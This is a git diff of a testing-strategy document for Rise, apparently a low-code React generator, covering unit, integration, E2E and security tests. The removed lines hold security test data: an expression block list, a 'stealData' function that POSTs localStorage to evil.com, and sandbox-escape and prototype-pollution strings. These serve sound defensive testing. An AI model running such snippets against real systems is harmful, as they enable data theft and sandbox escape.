@@ -1,1044 +1,557 @@
 # Testing Strategy
 
-## Overview
+> Comprehensive testing approach for Rise - ensuring reliability, security, and code quality from MVP to production.
 
-Testing a visual low-code development tool like Rise requires a multi-layered approach that covers:
+## Philosophy
 
-1. **🔧 Core Engine Testing**: Manifest management, code generation, expression evaluation
-2. **🎨 Visual Editor Testing**: UI interactions, drag-and-drop, property editing
-3. **🤖 AI Integration Testing**: Code generation, review, and suggestion quality
-4. **🔒 Security Testing**: Expression sandboxing, custom function safety
-5. **📱 Generated Code Testing**: Quality and correctness of output
+Rise has a unique testing challenge: we generate code that must be **correct, secure, and performant**. A bug in our code generator could affect hundreds of users' projects.
 
----
-
-## Testing Pyramid for Visual Development Tools
-
-```
-                    🎭 Manual Testing
-                   (UX, AI Quality, Edge Cases)
-                         
-                  📱 E2E Testing
-                (Full workflows, integration)
-                  
-               🔌 Integration Testing  
-             (Components working together)
-             
-          🔧 Unit Testing
-        (Core functions, utilities)
-```
+**Core Testing Principles**:
+1. **Test the Generator, Not Just the Output**: Validate the engine that creates code
+2. **Security is Non-Negotiable**: Every security feature must have tests
+3. **Generated Code Must Be Tested**: User projects should work out of the box
+4. **Fast Feedback Loops**: Tests run in < 5 minutes locally
+5. **Confidence to Ship**: 80%+ coverage on core systems
 
 ---
 
-## 1. Unit Testing (Foundation Layer)
+## Testing Pyramid
 
-### Core Engine Components
+```
+           /\
+          /  \    E2E Tests (10%)
+         /────\   Critical user workflows
+        /      \  
+       /────────\ Integration Tests (30%)
+      /          \ Component → Generation → Preview
+     /────────────\
+    /              \ Unit Tests (60%)
+   /────────────────\ Manifest, Generator, Parser
+  /──────────────────\
+```
 
-#### Manifest Management
+**Distribution**:
+- **60% Unit Tests**: Fast, focused, high coverage
+- **30% Integration Tests**: Key workflows end-to-end  
+- **10% E2E Tests**: Critical paths in actual Electron app
+
+---
+
+## Test Infrastructure
+
+### Tools & Frameworks
+
+```json
+{
+  "devDependencies": {
+    "vitest": "^1.0.0",           // Unit + Integration testing
+    "playwright": "^1.40.0",      // E2E testing
+    "@testing-library/react": "^14.0.0",
+    "@testing-library/jest-dom": "^6.0.0",
+    "@testing-library/user-event": "^14.0.0",
+    "msw": "^2.0.0",              // API mocking
+    "c8": "^8.0.0"                // Coverage
+  }
+}
+```
+
+### Project Structure
+
+```
+tests/
+├── unit/                      # Unit tests
+│   ├── manifest/
+│   │   ├── manager.test.ts
+│   │   ├── validator.test.ts
+│   │   └── schema.test.ts
+│   ├── generator/
+│   │   ├── react-generator.test.ts
+│   │   ├── imports.test.ts
+│   │   └── optimization.test.ts
+│   ├── parser/
+│   │   ├── expression-parser.test.ts
+│   │   ├── component-parser.test.ts
+│   │   └── ast-validator.test.ts
+│   └── security/
+│       ├── sandbox.test.ts
+│       ├── plugin-security.test.ts
+│       └── input-sanitizer.test.ts
+│
+├── integration/              # Integration tests
+│   ├── workflows/
+│   │   ├── create-project.test.ts
+│   │   ├── add-component.test.ts
+│   │   └── generate-preview.test.ts
+│   ├── plugins/
+│   │   ├── react-plugin.test.ts
+│   │   └── vue-plugin.test.ts
+│   └── ai/
+│       └── claude-integration.test.ts
+│
+├── e2e/                      # End-to-end tests
+│   ├── user-flows/
+│   │   ├── first-project.spec.ts
+│   │   ├── component-editing.spec.ts
+│   │   └── preview-debug.spec.ts
+│   └── fixtures/
+│       └── sample-projects/
+│
+├── security/                 # Security-specific tests
+│   ├── penetration/
+│   │   ├── expression-injection.test.ts
+│   │   ├── plugin-escape.test.ts
+│   │   └── api-key-extraction.test.ts
+│   └── audit/
+│       └── dependency-scan.test.ts
+│
+└── generated-code/          # Tests for generated projects
+    ├── build.test.ts
+    ├── runtime.test.ts
+    └── eslint.test.ts
+```
+
+---
+
+## Unit Testing (60% of tests)
+
+### Coverage Targets
+
+| Component | Target Coverage | Priority |
+|-----------|----------------|----------|
+| Manifest Manager | 90% | Critical |
+| Code Generator | 85% | Critical |
+| Expression Parser | 95% | Critical |
+| Security Sandbox | 100% | Critical |
+| Plugin System | 80% | High |
+| UI Components | 70% | Medium |
+| File Watcher | 85% | High |
+
+### Example: Manifest Manager Tests
+
 ```typescript
-// tests/manifest/ManifestManager.test.ts
-import { ManifestManager } from '../src/engine/manifest/ManifestManager';
+// tests/unit/manifest/manager.test.ts
+import { describe, it, expect, beforeEach, vi } from 'vitest';
+import { ManifestManager } from '@/engine/manifest/manager';
+import { ComponentSchema } from '@/shared/types';
 
 describe('ManifestManager', () => {
   let manager: ManifestManager;
-  
+
   beforeEach(() => {
     manager = new ManifestManager();
   });
-  
-  describe('component operations', () => {
-    test('adds component to manifest', () => {
-      const component = {
+
+  describe('Component Operations', () => {
+    it('should add a component to manifest', () => {
+      const component: ComponentSchema = {
         id: 'comp_001',
         displayName: 'Button',
-        type: 'button'
+        type: 'PrimitiveComponent',
+        properties: {},
       };
-      
-      manager.addComponent('root', component);
-      
-      expect(manager.getComponent('comp_001')).toEqual(component);
-      expect(manager.getComponent('root').children).toContain('comp_001');
+
+      manager.addComponent(component);
+
+      const result = manager.getComponent('comp_001');
+      expect(result).toEqual(component);
     });
-    
-    test('validates component schema', () => {
+
+    it('should reject component with duplicate ID', () => {
+      const component: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Button',
+        type: 'PrimitiveComponent',
+        properties: {},
+      };
+
+      manager.addComponent(component);
+
+      expect(() => {
+        manager.addComponent(component);
+      }).toThrow('Component with ID comp_001 already exists');
+    });
+
+    it('should update component properties', () => {
+      const component: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Button',
+        type: 'PrimitiveComponent',
+        properties: {
+          label: { type: 'static', value: 'Old Label' },
+        },
+      };
+
+      manager.addComponent(component);
+      
+      manager.updateComponent('comp_001', {
+        properties: {
+          label: { type: 'static', value: 'New Label' },
+        },
+      });
+
+      const updated = manager.getComponent('comp_001');
+      expect(updated.properties.label.value).toBe('New Label');
+    });
+
+    it('should remove component and its children', () => {
+      const parent: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Parent',
+        type: 'CompositeComponent',
+        children: ['comp_002'],
+        properties: {},
+      };
+
+      const child: ComponentSchema = {
+        id: 'comp_002',
+        displayName: 'Child',
+        type: 'PrimitiveComponent',
+        properties: {},
+      };
+
+      manager.addComponent(parent);
+      manager.addComponent(child);
+      
+      manager.removeComponent('comp_001');
+
+      expect(manager.getComponent('comp_001')).toBeNull();
+      expect(manager.getComponent('comp_002')).toBeNull();
+    });
+  });
+
+  describe('Validation', () => {
+    it('should validate component schema', () => {
       const invalidComponent = {
-        // Missing required id field
-        displayName: 'Invalid',
-        type: 'button'
+        id: 'comp_001',
+        displayName: 'Button',
+        // Missing 'type' field
+        properties: {},
       };
-      
-      expect(() => {
-        manager.addComponent('root', invalidComponent);
-      }).toThrow('Component must have an id');
-    });
-    
-    test('prevents circular dependencies', () => {
-      manager.addComponent('root', { id: 'comp_A', children: ['comp_B'] });
-      manager.addComponent('root', { id: 'comp_B', children: ['comp_C'] });
-      
-      expect(() => {
-        manager.addComponent('comp_C', { id: 'comp_A' }); // Would create cycle
-      }).toThrow('Circular dependency detected');
-    });
-  });
-  
-  describe('manifest validation', () => {
-    test('validates complete manifest structure', () => {
-      const manifest = createValidManifest();
-      const result = manager.validate(manifest);
-      
-      expect(result.isValid).toBe(true);
-      expect(result.errors).toEqual([]);
-    });
-    
-    test('detects invalid property types', () => {
-      const manifest = {
-        components: {
-          comp_001: {
-            properties: {
-              invalidProp: {
-                type: 'unknown-type', // Invalid
-                value: 'test'
-              }
-            }
-          }
-        }
-      };
-      
-      const result = manager.validate(manifest);
-      
+
+      const result = manager.validateComponent(invalidComponent);
+
       expect(result.isValid).toBe(false);
-      expect(result.errors).toContain('Unknown property type: unknown-type');
-    });
-  });
-});
-```
-
-#### Expression Validation
-```typescript
-// tests/expressions/ExpressionValidator.test.ts
-import { ExpressionValidator } from '../src/engine/expressions/ExpressionValidator';
-
-describe('ExpressionValidator', () => {
-  let validator: ExpressionValidator;
-  
-  beforeEach(() => {
-    validator = new ExpressionValidator();
-  });
-  
-  describe('simple expressions (sandboxed)', () => {
-    test('allows safe expressions', () => {
-      const safeExpressions = [
-        'user.name',
-        'items.length > 0',
-        'Math.round(price * 1.1)',
-        'user.firstName + " " + user.lastName',
-        'theme === "dark" ? "bg-gray-900" : "bg-white"'
-      ];
-      
-      safeExpressions.forEach(expr => {
-        const result = validator.validateExpression(expr);
-        expect(result.isValid).toBe(true);
-        expect(result.violations).toEqual([]);
-      });
-    });
-    
-    test('blocks dangerous expressions', () => {
-      const dangerousExpressions = [
-        'fetch("/api/data")',
-        'localStorage.setItem("key", "value")',
-        'eval("malicious code")',
-        'document.createElement("script")',
-        'window.location = "https://evil.com"',
-        'while(true) { }'
-      ];
-      
-      dangerousExpressions.forEach(expr => {
-        const result = validator.validateExpression(expr);
-        expect(result.isValid).toBe(false);
-        expect(result.violations.length).toBeGreaterThan(0);
-      });
-    });
-    
-    test('detects syntax errors', () => {
-      const syntaxErrors = [
-        'user.name +', // Incomplete
-        'if (true { }', // Missing parenthesis
-        'user..name', // Double dot
-        'function() { }' // Function declaration not allowed
-      ];
-      
-      syntaxErrors.forEach(expr => {
-        const result = validator.validateExpression(expr);
-        expect(result.isValid).toBe(false);
-        expect(result.violations[0]).toContain('Syntax error');
-      });
-    });
-  });
-  
-  describe('custom functions (full power)', () => {
-    test('allows any valid JavaScript', () => {
-      const powerfulFunctions = [
-        'async function fetchData() { return await fetch("/api/data"); }',
-        'function saveToStorage(key, value) { localStorage.setItem(key, value); }',
-        'function processPayment() { return stripe.createToken(); }'
-      ];
-      
-      powerfulFunctions.forEach(fn => {
-        const result = validator.validateCustomFunction(fn);
-        expect(result.isValid).toBe(true);
-      });
-    });
-    
-    test('provides security warnings', () => {
-      const riskyFunction = `
-        function stealData() {
-          fetch('https://evil.com/steal', {
-            method: 'POST',
-            body: JSON.stringify(localStorage)
-          });
-        }
-      `;
-      
-      const result = validator.validateCustomFunction(riskyFunction);
-      expect(result.isValid).toBe(true); // Allowed but warned
-      expect(result.warnings).toContain('External API call detected');
-      expect(result.warnings).toContain('localStorage access detected');
-    });
-  });
-});
-```
-
-#### Code Generation
-```typescript
-// tests/generator/ReactGenerator.test.ts
-import { ReactGenerator } from '../src/engine/generator/ReactGenerator';
-
-describe('ReactGenerator', () => {
-  let generator: ReactGenerator;
-  
-  beforeEach(() => {
-    generator = new ReactGenerator();
-  });
-  
-  test('generates valid React component', () => {
-    const manifest = {
-      id: 'comp_001',
-      displayName: 'UserCard',
-      properties: {
-        user: { type: 'prop', dataType: 'object' },
-        displayName: { 
-          type: 'expression', 
-          expression: 'user.firstName + " " + user.lastName' 
-        }
-      }
-    };
-    
-    const code = generator.generateComponent(manifest);
-    
-    // Check structure
-    expect(code).toContain('export default function UserCard');
-    expect(code).toContain('const displayName = user.firstName + " " + user.lastName');
-    expect(code).toContain('PropTypes');
-    
-    // Validate syntax
-    expect(() => {
-      require('@babel/parser').parse(code, { sourceType: 'module', plugins: ['jsx'] });
-    }).not.toThrow();
-    
-    // Check for proper imports
-    expect(code).toMatch(/import React/);
-    expect(code).toMatch(/import PropTypes/);
-  });
-  
-  test('generates proper PropTypes', () => {
-    const manifest = {
-      id: 'comp_001',
-      displayName: 'TestComponent',
-      properties: {
-        title: { type: 'prop', dataType: 'string', required: true },
-        count: { type: 'prop', dataType: 'number', required: false },
-        items: { type: 'prop', dataType: 'array', required: true }
-      }
-    };
-    
-    const code = generator.generateComponent(manifest);
-    
-    expect(code).toContain('title: PropTypes.string.isRequired');
-    expect(code).toContain('count: PropTypes.number');
-    expect(code).toContain('items: PropTypes.array.isRequired');
-  });
-  
-  test('handles custom functions', () => {
-    const manifest = {
-      id: 'comp_001',
-      displayName: 'TestComponent',
-      properties: {
-        formattedDate: {
-          type: 'customFunction',
-          functionName: 'formatDate',
-          args: ['props.createdAt', '"YYYY-MM-DD"']
-        }
-      }
-    };
-    
-    const code = generator.generateComponent(manifest);
-    
-    expect(code).toContain('import { formatDate } from');
-    expect(code).toContain('formatDate(createdAt, "YYYY-MM-DD")');
-  });
-});
-```
-
-### AI Integration Components
-```typescript
-// tests/ai/AIAssistant.test.ts
-import { AIAssistant } from '../src/engine/ai/AIAssistant';
-
-describe('AIAssistant', () => {
-  let ai: AIAssistant;
-  
-  beforeEach(() => {
-    ai = new AIAssistant({ apiKey: 'test-key', provider: 'mock' });
-  });
-  
-  test('generates component from description', async () => {
-    const prompt = 'Create a button component with title and onClick handler';
-    
-    const result = await ai.generateComponent(prompt);
-    
-    expect(result.success).toBe(true);
-    expect(result.component.displayName).toBe('Button');
-    expect(result.component.properties.title).toBeDefined();
-    expect(result.component.eventHandlers.onClick).toBeDefined();
-  });
-  
-  test('handles invalid prompts gracefully', async () => {
-    const prompt = ''; // Empty prompt
-    
-    const result = await ai.generateComponent(prompt);
-    
-    expect(result.success).toBe(false);
-    expect(result.error).toContain('prompt');
-  });
-  
-  test('sanitizes code before sending to AI', () => {
-    const codeWithSecrets = `
-      const apiKey = "sk-1234567890abcdef";
-      const password = "secret123";
-      fetch("https://api.example.com/data");
-    `;
-    
-    const sanitized = ai.sanitizeCodeForReview(codeWithSecrets);
-    
-    expect(sanitized).not.toContain('sk-1234567890abcdef');
-    expect(sanitized).not.toContain('secret123');
-    expect(sanitized).toContain('[REDACTED]');
-  });
-});
-```
-
----
-
-## 2. Integration Testing (Component Interaction)
-
-### Visual Editor Integration
-```typescript
-// tests/integration/VisualEditor.test.ts
-import { render, screen, fireEvent } from '@testing-library/react';
-import { VisualEditor } from '../src/renderer/components/VisualEditor';
-
-describe('Visual Editor Integration', () => {
-  test('complete component creation workflow', async () => {
-    const { getByTestId, getByText } = render(<VisualEditor />);
-    
-    // 1. Add component to tree
-    const addButton = getByTestId('add-component-button');
-    fireEvent.click(addButton);
-    
-    const buttonOption = getByText('Button');
-    fireEvent.click(buttonOption);
-    
-    // 2. Edit properties
-    const propertyPanel = getByTestId('property-panel');
-    expect(propertyPanel).toBeInTheDocument();
-    
-    const titleInput = getByTestId('property-title-input');
-    fireEvent.change(titleInput, { target: { value: 'Click me!' } });
-    
-    // 3. Verify manifest update
-    await waitFor(() => {
-      const manifestPreview = getByTestId('manifest-preview');
-      expect(manifestPreview.textContent).toContain('"title": "Click me!"');
-    });
-    
-    // 4. Check generated code
-    const codeTab = getByTestId('code-tab');
-    fireEvent.click(codeTab);
-    
-    const codeEditor = getByTestId('code-editor');
-    expect(codeEditor.textContent).toContain('Click me!');
-  });
-  
-  test('expression editor integration', async () => {
-    const { getByTestId } = render(<VisualEditor />);
-    
-    // Create component with expression
-    // ... setup code ...
-    
-    const expressionButton = getByTestId('expression-toggle');
-    fireEvent.click(expressionButton);
-    
-    const expressionEditor = getByTestId('expression-editor');
-    fireEvent.change(expressionEditor, { 
-      target: { value: 'user.name.toUpperCase()' } 
-    });
-    
-    // Verify validation
-    await waitFor(() => {
-      const validationIcon = getByTestId('expression-validation');
-      expect(validationIcon).toHaveClass('valid');
-    });
-    
-    // Verify autocomplete
-    fireEvent.change(expressionEditor, { 
-      target: { value: 'user.' } 
-    });
-    
-    await waitFor(() => {
-      const autocomplete = getByTestId('expression-autocomplete');
-      expect(autocomplete).toBeInTheDocument();
-      expect(autocomplete.textContent).toContain('name');
-      expect(autocomplete.textContent).toContain('email');
-    });
-  });
-});
-```
-
-### Code Generation Pipeline
-```typescript
-// tests/integration/CodeGeneration.test.ts
-describe('Code Generation Pipeline', () => {
-  test('manifest → code → compilation', async () => {
-    const manifest = createComplexManifest();
-    
-    // 1. Generate code
-    const generator = new ReactGenerator();
-    const files = generator.generateProject(manifest);
-    
-    expect(files).toHaveProperty('src/App.jsx');
-    expect(files).toHaveProperty('src/components/UserCard.jsx');
-    expect(files).toHaveProperty('src/utils/globalFunctions.js');
-    
-    // 2. Write to temporary directory
-    const tempDir = await createTempProject(files);
-    
-    // 3. Install dependencies
-    await execAsync('npm install', { cwd: tempDir });
-    
-    // 4. Verify compilation
-    const buildResult = await execAsync('npm run build', { cwd: tempDir });
-    expect(buildResult.exitCode).toBe(0);
-    
-    // 5. Verify generated files exist
-    expect(fs.existsSync(path.join(tempDir, 'dist/index.html'))).toBe(true);
-    expect(fs.existsSync(path.join(tempDir, 'dist/assets'))).toBe(true);
-    
-    // 6. Cleanup
-    await fs.rm(tempDir, { recursive: true });
-  });
-  
-  test('hot reload functionality', async () => {
-    const project = await createTestProject();
-    
-    // Start dev server
-    const devServer = startDevServer(project.path);
-    await waitForServer(devServer.port);
-    
-    // Make change to manifest
-    const updatedManifest = {
-      ...project.manifest,
-      components: {
-        ...project.manifest.components,
-        comp_001: {
-          ...project.manifest.components.comp_001,
-          properties: {
-            title: { type: 'static', value: 'Updated Title' }
-          }
-        }
-      }
-    };
-    
-    // Trigger regeneration
-    await project.updateManifest(updatedManifest);
-    
-    // Verify hot reload
-    await waitFor(async () => {
-      const response = await fetch(`http://localhost:${devServer.port}`);
-      const html = await response.text();
-      expect(html).toContain('Updated Title');
-    }, { timeout: 5000 });
-    
-    devServer.stop();
-  });
-});
-```
-
----
-
-## 3. End-to-End Testing (User Workflows)
-
-### Complete User Journeys
-```typescript
-// tests/e2e/UserJourneys.test.ts
-import { test, expect } from '@playwright/test';
-
-test.describe('Rise User Journeys', () => {
-  test('new user creates first project', async ({ page }) => {
-    // Start app
-    await page.goto('app://rise-editor');
-    
-    // Welcome screen
-    await expect(page.locator('[data-testid="welcome-screen"]')).toBeVisible();
-    
-    // Create new project
-    await page.click('[data-testid="new-project-button"]');
-    
-    await page.fill('[data-testid="project-name"]', 'My First App');
-    await page.selectOption('[data-testid="framework-select"]', 'react');
-    await page.click('[data-testid="create-project-button"]');
-    
-    // Wait for project to load
-    await expect(page.locator('[data-testid="component-tree"]')).toBeVisible();
-    await expect(page.locator('[data-testid="preview-panel"]')).toBeVisible();
-    
-    // Add first component
-    await page.click('[data-testid="add-component-button"]');
-    await page.click('[data-testid="component-type-button"]');
-    
-    // Configure component
-    await page.fill('[data-testid="property-title"]', 'Hello World');
-    
-    // Verify preview updates
-    const preview = page.frameLocator('[data-testid="preview-iframe"]');
-    await expect(preview.locator('button')).toContainText('Hello World');
-    
-    // Save project
-    await page.keyboard.press('Control+S');
-    await expect(page.locator('[data-testid="save-indicator"]')).toContainText('Saved');
-  });
-  
-  test('AI component generation workflow', async ({ page }) => {
-    await setupExistingProject(page);
-    
-    // Open AI assistant
-    await page.keyboard.press('Control+K');
-    await expect(page.locator('[data-testid="ai-modal"]')).toBeVisible();
-    
-    // Enter prompt
-    await page.fill('[data-testid="ai-prompt"]', 
-      'Create a user profile card with avatar, name, and edit button');
-    
-    await page.click('[data-testid="ai-generate-button"]');
-    
-    // Wait for AI response
-    await expect(page.locator('[data-testid="ai-thinking"]')).toBeVisible();
-    await expect(page.locator('[data-testid="ai-result"]')).toBeVisible({ timeout: 10000 });
-    
-    // Review generated component
-    await expect(page.locator('[data-testid="ai-result"]')).toContainText('UserProfileCard');
-    
-    // Accept suggestion
-    await page.click('[data-testid="ai-accept-button"]');
-    
-    // Verify component added to tree
-    await expect(page.locator('[data-testid="component-tree"]'))
-      .toContainText('UserProfileCard');
-    
-    // Verify properties panel shows AI-generated properties
-    await expect(page.locator('[data-testid="property-panel"]'))
-      .toContainText('avatar');
-  });
-  
-  test('expression editing with validation', async ({ page }) => {
-    await setupProjectWithComponent(page);
-    
-    // Select component property
-    await page.click('[data-testid="property-displayName"]');
-    
-    // Switch to expression mode
-    await page.click('[data-testid="expression-toggle"]');
-    
-    // Enter invalid expression
-    await page.fill('[data-testid="expression-editor"]', 'fetch("/api/data")');
-    
-    // Verify validation error
-    await expect(page.locator('[data-testid="expression-error"]'))
-      .toContainText('Blocked function call: fetch');
-    
-    // Enter valid expression
-    await page.fill('[data-testid="expression-editor"]', 
-      'user.firstName + " " + user.lastName');
-    
-    // Verify validation success
-    await expect(page.locator('[data-testid="expression-valid"]')).toBeVisible();
-    
-    // Verify autocomplete
-    await page.fill('[data-testid="expression-editor"]', 'user.');
-    await expect(page.locator('[data-testid="autocomplete-menu"]')).toBeVisible();
-    await expect(page.locator('[data-testid="autocomplete-menu"]'))
-      .toContainText('firstName');
-  });
-  
-  test('custom function creation and usage', async ({ page }) => {
-    await setupExistingProject(page);
-    
-    // Open global functions panel
-    await page.click('[data-testid="global-functions-tab"]');
-    
-    // Create new function
-    await page.click('[data-testid="add-function-button"]');
-    await page.fill('[data-testid="function-name"]', 'formatCurrency');
-    
-    // Enter function code
-    const functionCode = `
-      function formatCurrency(amount, currency = 'USD') {
-        return new Intl.NumberFormat('en-US', {
-          style: 'currency',
-          currency: currency
-        }).format(amount);
-      }
-    `;
-    
-    await page.fill('[data-testid="function-editor"]', functionCode);
-    
-    // Save function
-    await page.click('[data-testid="save-function-button"]');
-    
-    // Use function in component property
-    await page.click('[data-testid="component-tree"] >> text=ProductCard');
-    await page.click('[data-testid="property-price"]');
-    await page.selectOption('[data-testid="property-type"]', 'customFunction');
-    await page.selectOption('[data-testid="function-select"]', 'formatCurrency');
-    
-    // Verify function call in generated code
-    await page.click('[data-testid="code-tab"]');
-    await expect(page.locator('[data-testid="code-editor"]'))
-      .toContainText('formatCurrency(price');
-  });
-});
-```
-
-### Performance Testing
-```typescript
-// tests/e2e/Performance.test.ts
-test.describe('Performance Tests', () => {
-  test('handles large component trees', async ({ page }) => {
-    await setupExistingProject(page);
-    
-    // Create 100 components programmatically
-    for (let i = 0; i < 100; i++) {
-      await page.evaluate((index) => {
-        window.riseAPI.addComponent(`comp_${index}`, {
-          displayName: `Component${index}`,
-          type: 'div'
-        });
-      }, i);
-    }
-    
-    // Measure tree rendering performance
-    const startTime = Date.now();
-    await expect(page.locator('[data-testid="component-tree"]')).toBeVisible();
-    const renderTime = Date.now() - startTime;
-    
-    expect(renderTime).toBeLessThan(2000); // Should render in < 2 seconds
-    
-    // Test scrolling performance
-    await page.evaluate(() => {
-      const tree = document.querySelector('[data-testid="component-tree"]');
-      tree.scrollTop = tree.scrollHeight;
-    });
-    
-    // Verify UI remains responsive
-    await page.click('[data-testid="add-component-button"]');
-    await expect(page.locator('[data-testid="component-selector"]')).toBeVisible();
-  });
-  
-  test('expression evaluation performance', async ({ page }) => {
-    await setupProjectWithComponent(page);
-    
-    // Add complex expression
-    const complexExpression = 'items.filter(i => i.active).map(i => i.name).join(", ")';
-    await page.fill('[data-testid="expression-editor"]', complexExpression);
-    
-    // Measure evaluation time
-    const startTime = await page.evaluate(() => performance.now());
-    
-    // Trigger expression evaluation
-    await page.dispatchEvent('[data-testid="expression-editor"]', 'blur');
-    
-    const endTime = await page.evaluate(() => performance.now());
-    const evaluationTime = endTime - startTime;
-    
-    expect(evaluationTime).toBeLessThan(100); // Should evaluate in < 100ms
-  });
-});
-```
-
----
-
-## 4. Security Testing
-
-### Expression Sandboxing
-```typescript
-// tests/security/ExpressionSecurity.test.ts
-describe('Expression Security', () => {
-  test('prevents code execution attacks', () => {
-    const maliciousExpressions = [
-      'eval("alert(\'XSS\')")',
-      'Function("return process")().exit()',
-      'constructor.constructor("return process")()',
-      'this.constructor.constructor("return process")()',
-      '__proto__.constructor.constructor("return process")()'
-    ];
-    
-    const validator = new ExpressionValidator();
-    
-    maliciousExpressions.forEach(expr => {
-      const result = validator.validateExpression(expr);
-      expect(result.isValid).toBe(false);
-      expect(result.violations).toContainEqual(
-        expect.stringContaining('Blocked')
+      expect(result.errors).toContainEqual(
+        expect.objectContaining({
+          field: 'type',
+          message: expect.stringContaining('required'),
+        })
       );
     });
-  });
-  
-  test('prevents prototype pollution', () => {
-    const pollutionAttempts = [
-      '__proto__.isAdmin = true',
-      'constructor.prototype.isAdmin = true',
-      'Object.prototype.isAdmin = true',
-      'Array.prototype.isAdmin = true'
-    ];
-    
-    const validator = new ExpressionValidator();
-    
-    pollutionAttempts.forEach(expr => {
-      const result = validator.validateExpression(expr);
-      expect(result.isValid).toBe(false);
+
+    it('should validate circular references', () => {
+      const comp1: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Component1',
+        type: 'CompositeComponent',
+        children: ['comp_002'],
+        properties: {},
+      };
+
+      const comp2: ComponentSchema = {
+        id: 'comp_002',
+        displayName: 'Component2',
+        type: 'CompositeComponent',
+        children: ['comp_001'], // Circular!
+        properties: {},
+      };
+
+      manager.addComponent(comp1);
+
+      expect(() => {
+        manager.addComponent(comp2);
+      }).toThrow('Circular reference detected');
     });
   });
-  
-  test('sandbox execution limits', async () => {
-    const executor = new ExpressionExecutor();
-    
-    // Test infinite loop detection
-    const infiniteLoop = 'while(true) { }';
-    
-    await expect(
-      executor.execute(infiniteLoop, {})
-    ).rejects.toThrow('execution timed out');
-    
-    // Test memory limits
-    const memoryBomb = 'new Array(1000000).fill("x".repeat(1000))';
-    
-    await expect(
-      executor.execute(memoryBomb, {})
-    ).rejects.toThrow('memory limit exceeded');
-  });
-});
-```
 
-### AI Security Testing
-```typescript
-// tests/security/AISecurity.test.ts
-describe('AI Security', () => {
-  test('sanitizes sensitive data before AI calls', () => {
-    const codeWithSecrets = `
-      const apiKey = "sk-1234567890abcdef";
-      const dbPassword = "secret123";
-      const privateKey = "-----BEGIN PRIVATE KEY-----";
-      fetch("https://internal-api.company.com/data");
-    `;
-    
-    const sanitizer = new CodeSanitizer();
-    const sanitized = sanitizer.sanitizeForAI(codeWithSecrets);
-    
-    // API keys should be redacted
-    expect(sanitized).not.toContain('sk-1234567890abcdef');
-    expect(sanitized).toContain('API_KEY="[REDACTED]"');
-    
-    // Passwords should be redacted
-    expect(sanitized).not.toContain('secret123');
-    expect(sanitized).toContain('password="[REDACTED]"');
-    
-    // Private keys should be redacted
-    expect(sanitized).not.toContain('-----BEGIN PRIVATE KEY-----');
-    
-    // Internal URLs should be generalized
-    expect(sanitized).not.toContain('internal-api.company.com');
-    expect(sanitized).toContain('api.example.com');
-  });
-  
-  test('validates AI-generated code', async () => {
-    const mockAI = new MockAIProvider();
-    
-    // Mock malicious AI response
-    mockAI.setNextResponse({
-      component: {
-        displayName: 'MaliciousComponent',
-        properties: {
-          evilProp: {
-            type: 'expression',
-            expression: 'eval("alert(\'hacked\')")'
-          }
-        }
-      }
+  describe('Serialization', () => {
+    it('should save manifest to JSON', async () => {
+      const component: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Button',
+        type: 'PrimitiveComponent',
+        properties: {},
+      };
+
+      manager.addComponent(component);
+
+      const json = await manager.toJSON();
+      const parsed = JSON.parse(json);
+
+      expect(parsed.components).toHaveProperty('comp_001');
+      expect(parsed.schemaVersion).toBe('1.0.0');
     });
-    
-    const aiAssistant = new AIAssistant({ provider: mockAI });
-    const result = await aiAssistant.generateComponent('Create a button');
-    
-    // AI-generated expressions should still be validated
-    expect(result.warnings).toContainEqual(
-      expect.stringContaining('security concern')
-    );
-    expect(result.component.properties.evilProp.expression)
-      .not.toContain('eval');
-  });
-});
-```
 
----
-
-## 5. Generated Code Quality Testing
-
-### Code Quality Validation
-```typescript
-// tests/quality/GeneratedCodeQuality.test.ts
-describe('Generated Code Quality', () => {
-  test('passes ESLint validation', async () => {
-    const manifest = createComplexManifest();
-    const generator = new ReactGenerator();
-    const code = generator.generateComponent(manifest.components.userCard);
-    
-    const eslint = new ESLint({
-      useEslintrc: false,
-      overrideConfig: {
-        extends: ['react-app', 'react-app/jest'],
-        parserOptions: {
-          ecmaVersion: 2020,
-          sourceType: 'module',
-          ecmaFeatures: { jsx: true }
-        }
-      }
-    });
-    
-    const results = await eslint.lintText(code, { filePath: 'TestComponent.jsx' });
-    
-    expect(results[0].errorCount).toBe(0);
-    expect(results[0].warningCount).toBe(0);
-  });
-  
-  test('generates proper TypeScript types', async () => {
-    const manifest = createTypedManifest();
-    const generator = new ReactGenerator({ typescript: true });
-    const code = generator.generateComponent(manifest.components.userCard);
-    
-    // Should have proper interface
-    expect(code).toMatch(/interface.*Props/);
-    expect(code).toContain('React.FC<');
-    
-    // Validate TypeScript compilation
-    const ts = require('typescript');
-    const result = ts.transpileModule(code, {
-      compilerOptions: {
-        target: ts.ScriptTarget.ES2015,
-        module: ts.ModuleKind.CommonJS,
-        jsx: ts.JsxEmit.React,
-        strict: true
-      }
-    });
-    
-    expect(result.diagnostics).toEqual([]);
-  });
-  
-  test('generates accessible components', () => {
-    const manifest = {
-      id: 'comp_001',
-      displayName: 'Button',
-      properties: {
-        onClick: { type: 'eventHandler' },
-        disabled: { type: 'prop', dataType: 'boolean' }
-      },
-      accessibility: {
-        role: 'button',
-        ariaLabel: 'props.title'
-      }
-    };
-    
-    const generator = new ReactGenerator();
-    const code = generator.generateComponent(manifest);
-    
-    // Should include accessibility attributes
-    expect(code).toContain('role="button"');
-    expect(code).toContain('aria-label=');
-    
-    // Should handle keyboard navigation
-    expect(code).toContain('onKeyDown');
-    expect(code).toMatch(/key.*Enter|Space/);
-  });
-});
-```
-
-### Runtime Testing of Generated Components
-```typescript
-// tests/quality/RuntimeTesting.test.ts
-describe('Generated Component Runtime', () => {
-  test('components render without errors', () => {
-    const manifest = createComponentManifest();
-    const generator = new ReactGenerator();
-    const componentCode = generator.generateComponent(manifest);
-    
-    // Dynamically import and test component
-    const Component = requireFromString(componentCode, 'TestComponent.jsx');
-    
-    const testProps = {
-      user: { id: 1, name: 'John Doe', email: 'john@example.com' },
-      onClick: jest.fn()
-    };
-    
-    const { getByRole } = render(<Component {...testProps} />);
-    
-    // Should render without throwing
-    expect(getByRole('button')).toBeInTheDocument();
-    expect(getByRole('button')).toHaveTextContent('John Doe');
-  });
-  
-  test('expressions evaluate correctly', () => {
-    const manifest = {
-      id: 'comp_001',
-      displayName: 'UserCard',
-      properties: {
-        displayName: {
